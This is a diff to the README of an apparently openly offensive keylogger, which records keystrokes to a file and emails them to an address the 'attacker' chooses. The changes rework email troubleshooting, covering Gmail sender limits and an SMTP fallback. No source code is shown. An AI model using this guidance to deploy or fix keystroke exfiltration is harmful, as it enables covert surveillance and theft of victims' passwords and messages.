@@ -6,7 +6,7 @@
 
 This is a basic keylogger. It captures keystrokes and records them locally in a file ```keylogs.txt```.
 
-After a certain number of keystrokes (specified by the attacker), the script will email ```keylogs.txt``` to a specified email address.
+After a certain number of keystrokes (specified by the attacker), the script will email ```keylogs.txt``` to a specified email address. Duwe to Google's security features, the sender email address cnnot be a gmail account.
 
 Additionally, immediately after the keylogger is stopped, the script will email ```keylogs.txt``` to a specified email address.
 
@@ -41,12 +41,7 @@ If your sender email address is a gmail account, and you are getting the followi
 ```
 smtplib.SMTPAuthenticationError: (535, b'5.7.8 Username and Password not accepted. Learn more at\n5.7.8  https://support.google.com/mail/?p=BadCredentials k125-20020a37a183000000b005f170f7e497sm4061876qke.47 - gsmtp')
 ```
-Make sure that you have entered the corrected login creditials.
-
-If the problem persists, you may have to allow less secure apps to access your google account. 
-
-- You can find more information on this subject here: https://support.google.com/accounts/answer/6010255.
-- ***DO NOT DISABLE THIS FEATURE ON YOUR PERSONAL GMAIL ACCOUNT***. Disabling this security feature will make your google account more vulnerable to attacks. Making an entirely new google account hat is not associated with your personal account(s) is recommended.
+Google no longer supports third-party programs to automatically sign into gmail accounts. It is recommended that you use a different email service. You can find more information here: https://support.google.com/accounts/answer/6010255.
 
 If you get the following error:
 ```
@@ -58,7 +53,6 @@ You have two options:
     ```server = smtplib.SMTP_SSL(SMTP_SERVER, PORT)```  
     to:  
     ```server = smtplib.SMTP(SMTP_SERVER, PORT)```
-    - Note: Due to Google's strict security policies, you will not be able to send an eamil via ```smtp.gmail.com``` withought SSL/TLS 
 
 ---
 
